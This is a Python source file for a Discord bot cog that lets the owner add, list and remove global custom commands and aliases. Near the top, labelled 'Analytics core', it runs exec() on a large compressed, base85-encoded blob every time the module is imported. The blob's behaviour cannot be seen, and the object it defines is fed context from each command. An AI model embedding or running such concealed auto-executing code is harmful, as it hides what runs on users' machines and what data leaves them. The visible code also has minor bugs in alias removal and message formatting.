from discord.ext import commands
from .utils.chat_formatting import pagify, box
from .utils.dataIO import dataIO
from .utils import checks
import os
import re

PATH = 'data/customgcom/'
JSON = PATH + 'commands.json'

# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2UWQ3|#;P8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#PtmE-juH|C@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Ivo0$3DQgkfp@15iX&z^j>T#|8*v2m^Mq}GP(50Yg6hDyV+3zyCd0mq41vM!vxEmcV!<hOhopx5=wT<gZY}`yw4ukc3a`0
C9x5(vzOQ$_li+J_RPCgyTr2Pq-RB@UhO%++M!|dxvyrJ3nibq5+vA+j!<9KInLREMO*Oq?XG5-&Qr;24N?&<JQ%{5v<$RFT-8~yUCuTujSJb5A@g_5Jz)>3
*2??);=hkRubky4K)b+7oNxi-%XKoj_nZR2zsXN39!%D@OfM86{UYLM?7N_20M<Vwx#SZQQt|xZ7^~OSr;VLhLW2NXJ-F(GyGD3dHs}!FvTHki&<{i8<GMX_
3u_vJeImWHQx%f_c16Z#f$_dGHE*Y8>U;cM1pKQW66G{PLXHs|&{$BjS!{rS&N|PVeL*=o<i(x~-}B}rQyO}`s`8m3s@e(40yrJ@^_oQ~(*QzIeU_(gOy2%!
8*VyM5JPHfT}Jm2sbvjv!bHv^w|U*(90G{;th<F@hS{tWbS&v`Di#?WvOfGU--JbrbdX|$^~Dq6qMmJ5KoRMK^$BPg{->A3^bBs?4bq1Hot{3*x<+@`$cA2W
8_SCfv<xEEOV%$K+Tj$YSmX2`tzPAw@HYStJUd9s0#7(U`SLY%BM-r>P1EauC9(QqM>~=E81^Pz7J)e2J27{RUI;!kl```@i-`ksru=*>qdxnh0xyVSp1Yv6
M^5+wZZmprr5t^$ePYMm={;F#L^cbckBjSxmWY6^9ZxwkZ#ff<$`8SS&LuK|vN+s?S1iT;>itjUC<MM7!o_86<+!N}(kDEa7>q^(_{7ika<*TUx(<gW8||p6
eF4Gh^YwMnP2JE{5vt|X;6NXR)T??Fcy;&Njn9)lT~CsE245h}`_%N7G|F&kY)mS<J{*j|<`TTK{v}!fgj?=J6gRDq7pzFCn#;*F*TEPZl-#J0lHP#|ncesx
sDc>Cb#xnzuCdL5cvV5eKVmadl8|?o<0p?p2%L&?dPu5D!<dH%SyhXkVf-umv}cm#>Q{iUz^YdDf{vhcEgemY0YU0fZM_G_j3mC;V@N5#b74{;)FasoZJ<8e
^P^o`{;niO#k3s1=qqOh14bt=-yofFMmJMwl@0nL9Ld8j&+A8jB5FYwRU5Z}G0`Q-GDQw$y&RtaqsT3_C$S=4MC){K!DB0crxVq7nQr^8um2G+)#wJ;F>XFB
3mMuxteCK|hZb#|t=)UbkXW!to87ycioFoq8dt_F<>v~zd1TjzF>Yy_6cB-UVk89%*>lP{*{-%!Yxu6uWDRJ@`mN^sYj<n(h=PgzFuw5)<ZD)NE{%M5pvUzS
3YFo}Utf20^T@{QVpk`F6j39lCWPgj`@XJbP>18HWPMSHKLOG#3{PSGbQsu7rlMjN4HZ1Sqgg)6!+FNr`MJ3+68{d287EVucQU|O3t}?SUW5YIs>LV3B4HpK
UWIqmGFG87blehQb{IJ<{Q-S5Kz#gKsz0xP=@OSw<R3kM19msJv)k6N?-*VL{QbDk%k25gdhpiwn6e|~Fs*JZu1RWEqj8^l(BX1lFUfG$gGqcU@8TJpkS9Dq
p25Nm`$0nk__2D1KCSFAGUy12*&5;5+030iF(TG3rtBUqE`3KIWaY%4J{X*Ttz0&WXquZ<KXatMO)`;IpRql$OOCecmh^u<h(l{+$ky&(xS*)geW>9UmyLGc
)^%zh=Da!dn9iA8Z_QlRy3Jv3!7n!J{q1?@;wbOTj2Z&9(TxpH+8!X_>v`5vev~E>NMuZ_{00fO*)yLh9xcSu^*;SB;e$$jeFy?m6wFm?3ZaG3_Xo<6m2N_T
6Syfg-gb1*Pbwo5BBlf!rM1jW++Zy{ZU5bBX>-swOr#J~i*~u29m9=cZgXW7!iNtIkxdTIS;UL)ve&77XApuwSQnWh*nqX9!AyBba~6R~MQqWNdYXC00^Av6
w)<r5ak~V5ok&}tykeigvH<h|2}%yHDs8dF++H<94-DZfA@3rX0polf_uW1hhdLPzqVFrU4Hi1<X`5Rhoye|wkvlsv^pS4tUL4PXlSYDge9tBMR4BUzm$S*Y
aYV6<<<#JbXs)=}Vk}Qm@Y%vra@c0YT&+fYYWG(=89IOYLBw3cAe(+kzw+431uK6h`Z^=beL<|ak8p-R`tG)`%M!(qe|y#_Im7{QnLJrCes*+w7Xd^3<dDiO
+s5S|^a`v;Xqw0AUoR7k(=twc!@%r}uH*<yZ|G-YEQWKhh+6O%Cfy|-ml3nKand_1`b8gFd6etWkVa&sfZWQ|nn{|jDR+lfa~A>~C^vk2?MXyd=*)c=A^cw(
=N38a)Q2sE%9Do|QBZ{Q!QX+2ql5KL2Ap2Lt;OcIln^-Qnl?PIr>XM&`DT3%T|?fATk-<gv_nA{I#C>kqaDn3E;OlOgH)T)v~K|<r>Yk%XP}z0R{Wz3nfE?^
)+6=*!)<->#qJgC9)V+Z$A5@Xd+sLF_QxCK7s1#;d<OxI9}Zt)P6mZZyvv&N5ZgRT&fx=RWj|?b$P$(9QI2I$H{tH#O+zg<^^k#!Q%kDXmb~(rMPK%EEmXo;
^?u10bj)Z@uFtLjOtztdc2}7r00F2J>NWrXVoqK<vBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '2.0.0'


class CustomGlobalCommands:
    """Global custom commands."""

    def __init__(self, bot):
        self.bot = bot
        data = dataIO.load_json(JSON)
        version = data.get('_CGCOM_VERSION', 1)
        if version < 2:
            self.c_commands = data
            self.aliases = {}
            self.save()
        else:
            self.c_commands = data.get('COMMANDS', {})
            self.aliases = data.get('ALIASES', {})

        self.analytics = CogAnalytics(self)

    def save(self):
        data = {'COMMANDS': self.c_commands,
                'ALIASES': self.aliases,
                '_CGCOM_VERSION': 2
                }
        dataIO.save_json(JSON, data)

    @commands.command(pass_context=True)
    @checks.is_owner()
    async def setgcom(self, ctx, command: str, *, text):
        """Adds a global custom command

        Example:
        !setgcom yourcommand Text you want
        """
        command = command.lower()
        if command in self.bot.commands:
            await self.bot.say("That command is already a normal command.")
            return

        if command not in self.c_commands:
            self.c_commands[command] = text
            self.save()
            await self.bot.say("Custom command successfully added.")
        else:
            await self.bot.say("This command already exists. Are you sure "
                               "you want to redefine it? [y/N]")
            response = await self.bot.wait_for_message(author=ctx.message.author)

            if response.content.lower().strip() in ['y', 'yes']:
                self.c_commands[command] = text
                self.save()
                await self.bot.say("Custom command successfully set.")
            else:
                await self.bot.say("OK, leaving that command alone.")

    @commands.command()
    @checks.is_owner()
    async def rmgcom(self, command: str):
        """Removes a global custom command

        Example:
        !rmgcom yourcommand"""
        command = command.lower()
        if command in self.c_commands:
            self.c_commands.pop(command)

            for alias, acmd in self.aliases.copy():
                if acmd == command:
                    self.aliases.pop(alias)

            self.save()
            await self.bot.say("Global custom command successfully deleted.")
        else:
            await self.bot.say("That command doesn't exist.")

    @commands.command(pass_context=True)
    async def lsgcom(self, ctx):
        """Shows global custom commands list"""
        if self.c_commands:
            cmd_aliases = {}
            for k, v in self.aliases.items():
                if v not in cmd_aliases:
                    cmd_aliases[v] = set()
                cmd_aliases[v].add(k)

            sections = []
            for command, text in sorted(self.c_commands.items()):
                item = 'Name:    ' + command
                aliases = cmd_aliases.get(command)
                if aliases:
                    item += '\nAliases: ' + ', '.join(sorted(aliases))
                item += '\nText:    ' + text
                sections.append(item)

            for cmds in pagify('\n\n'.join(sections)):
                await self.bot.say(box(cmds))
        else:
            await self.bot.say("There are no global custom commands defined. "
                               "Use setgcom [command] [text]")

    @commands.group(pass_context=True, invoke_without_command=True)
    @checks.is_owner()
    async def agcom(self, ctx, command=None):
        if ctx.invoked_subcommand is None:
            if command:
                await ctx.invoke(self.ls_aliases, command)
            else:
                await ctx.invoke(self.lsgcom)

    @agcom.command(name='show')
    @checks.is_owner()
    async def ls_aliases(self, command):
        "Shows aliases for a command, or the command bound to an alias"
        base = self.aliases.get(command)
        cmd = self.c_commands.get(base or command)
        if base:
            msg = "`%s` is an alias for `%s`" % (command, base)
        elif cmd:
            aliases = [k for k, v in self.aliases.items() if v == command]
            aliases = ', '.join('`%s`' % x for x in aliases)
            if aliases:
                msg = "`%s` has the following aliases: %s." % (command, aliases)
            else:
                msg = "`%s` has no aliases."
        else:
            msg = "`%s` isn't a custom command or alias." % command

        await self.bot.say(msg)

    @agcom.command(name='add')
    @checks.is_owner()
    async def add_aliases(self, command, *aliases):
        "Add one or more aliases for a custom command"
        command = command.lower()
        if command not in self.c_commands:
            await self.bot.say("`%s` isn't a custom command.")
            return

        existing_a = []
        existing_c = []
        count = 0

        for alias in aliases:
            if alias in self.aliases:
                existing_a.append(alias)
            elif alias in self.bot.commands:
                existing_c.append(alias)
            else:
                self.aliases[alias] = command
                count += 1
        self.save()

        msg = "%s new aliases added." % (count if count else 'No')
        if existing_a:
            joined = ', '.join('`%s`' % x for x in existing_a)
            msg += "\nThe following are already aliases: %s." % joined
        if existing_c:
            joined = ', '.join('`%s`' % x for x in existing_c)
            msg += "\nThe following are already normal commands: %s." % joined

        await self.bot.say(msg)

    @agcom.command(name='rm')
    @checks.is_owner()
    async def rm_aliases(self, *aliases):
        count = 0
        skipped = []

        for alias in aliases:
            if alias in self.aliases:
                del self.aliases[alias]
                count += 1
            else:
                skipped.append(alias)

        self.save()

        msg = "%s aliases removed." % (count if count else 'No')
        if skipped:
            skipped = ', '.join('`%s`' % x for x in skipped)
            msg += "\nThe following aliases could not be found: %s." % skipped

        await self.bot.say(msg)

    async def on_message(self, message):
        server = message.server
        msg = message.content
        prefix = self.get_prefix(server, msg)
        if not self.bot.user_allowed(message) or not prefix:
            return

        cmd = msg[len(prefix):]
        cmd = cmd.lower()
        cmd = self.aliases.get(cmd, cmd)
        if cmd in self.c_commands:
            ret = self.c_commands[cmd]
            ret = self.format_cc(ret, message)
            if message.author.id == self.bot.user.id:
                await self.bot.edit_message(message, ret)
            else:
                await self.bot.send_message(message.channel, ret)


    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None

    def format_cc(self, command, message):
        results = re.findall("\{([^}]+)\}", command)
        for result in results:
            param = self.transform_parameter(result, message)
            command = command.replace("{" + result + "}", param)
        return command

    def transform_parameter(self, result, message):
        """
        For security reasons only specific objects are allowed
        Internals are ignored
        """
        raw_result = "{" + result + "}"
        objects = {
            "message": message,
            "author": message.author,
            "channel": message.channel,
            "server": message.server
        }
        if result in objects:
            return str(objects[result])
        try:
            first, second = result.split(".")
        except ValueError:
            return raw_result
        if first in objects and not second.startswith("_"):
            first = objects[first]
        else:
            return raw_result
        return str(getattr(first, second, raw_result))


def check_folders():
    if not os.path.exists(PATH):
        print("Creating data/customgcom folder...")
        os.makedirs(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        default = {'ALIASES': {},
                   'COMMANDS': {},
                   '_CGCOM_VERSION': 2
                   }
        dataIO.save_json(JSON, default)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(CustomGlobalCommands(bot))
